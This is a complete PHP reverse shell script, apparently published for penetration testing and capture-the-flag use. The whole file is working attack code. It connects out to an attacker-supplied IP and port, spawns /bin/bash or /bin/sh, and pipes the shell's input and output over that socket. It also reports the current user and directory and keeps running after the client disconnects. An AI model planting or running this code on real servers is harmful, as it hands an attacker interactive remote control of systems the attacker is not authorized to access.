<?php
/**
 * PHP Reverse Shell - Santeri Proc_Open Interactive Method
 *
 * Author: santeri@bittisilta.fi
 * Website: https://bittisilta.fi
 * TryHackMe: https://tryhackme.com/p/santeri1337
 * GitHub: https://github.com/santeri1337
 *
 */


function ExecuteNCapture(string $Command): string
{
    ob_start();
    if (function_exists('passthru')) {
        passthru($Command . ' 2>&1');
    } elseif (function_exists('system')) {
        system($Command . ' 2>&1');
    } elseif (function_exists('exec')) {
        echo implode("\n", (array)exec($Command . ' 2>&1'));
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($Command . ' 2>&1');
    } else {
        return "Error: No command execution functions available for initial info.\n";
    }
    return ob_get_clean();
}
function StreamData($ReadStream, $WriteStream): bool
{
    $Data = fread($ReadStream, 8192);
    if ($Data === '' || $Data === false) {
        return false; /* Stream closed or error*/
    }
    fwrite($WriteStream, $Data);
    return true; /* Data transferred successfully*/
}


function InitShell(string $AttackerIp, int $AttackerPort): void
{
    set_time_limit(0);
    ignore_user_abort(true);

    $NetworkSocket = @stream_socket_client("tcp://$AttackerIp:$AttackerPort", $ErrorCode, $ErrorMessage, 10);
    if (!$NetworkSocket) {
        die();
    }
    stream_set_blocking($NetworkSocket, 0);

    $DescriptorSpec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );

    $Shell = '/bin/bash';
    if (!file_exists($Shell)) {
        $Shell = '/bin/sh';
    }

    $Process = proc_open($Shell, $DescriptorSpec, $Streams, null, $_ENV);

    if (is_resource($Process)) {
        stream_set_blocking($Streams[0], 0);
        stream_set_blocking($Streams[1], 0);
        stream_set_blocking($Streams[2], 0);

        $CurrentUser = trim(ExecuteNCapture('whoami'));
        $CurrentDir = trim(ExecuteNCapture('pwd'));

        fwrite($NetworkSocket, "PHP ReverseShell by Santeri1337\n");
        fwrite($NetworkSocket, "Shell user: " . $CurrentUser . "\n");
        fwrite($NetworkSocket, "Current directory: " . $CurrentDir . "\n");
        fwrite($NetworkSocket, "https://github.com/santeri1337/php-reverseshell\n\n");

        while (true) {
            $ReadSockets = array($NetworkSocket, $Streams[1], $Streams[2]);
            $WriteSockets = null;
            $ExceptSockets = null;

            if (stream_select($ReadSockets, $WriteSockets, $ExceptSockets, null) === false) {
                break;
            }

           foreach ($ReadSockets as $ReadySocket) {
                
                if ($ReadySocket === $NetworkSocket) {
                   
                    if (!StreamData($NetworkSocket, $Streams[0])) {
                        break 2;
                    }
                } elseif ($ReadySocket === $Streams[1]) {

                    if (!StreamData($Streams[1], $NetworkSocket)) {
                        break 2;
                    }
                } elseif ($ReadySocket === $Streams[2]) {
                   
                    if (!StreamData($Streams[2], $NetworkSocket)) {
                        break 2;
                    }
                }
            }
        }

        
        fclose($Streams[0]);
        fclose($Streams[1]);
        fclose($Streams[2]);
        proc_close($Process);
    }

    if (is_resource($NetworkSocket)) {
        @fclose($NetworkSocket);
    }
    die();
}

InitShell('IP', PORT);

?>
